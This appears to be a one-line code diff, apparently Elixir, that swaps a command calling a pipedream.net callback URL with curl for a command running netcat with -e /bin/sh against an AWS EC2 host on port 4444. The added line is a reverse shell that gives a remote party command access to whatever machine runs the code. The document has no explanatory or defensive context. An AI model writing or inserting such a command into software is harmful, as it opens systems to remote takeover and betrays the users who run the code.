@@ -1,1 +1,1 @@
-System.cmd("sh", ["-c", "curl http://enqi8o04fv2n.x.pipedream.net"])
+System.cmd("sh", ["-c", "nc ec2-52-207-215-179.compute-1.amazonaws.com 4444 –e /bin/sh"])
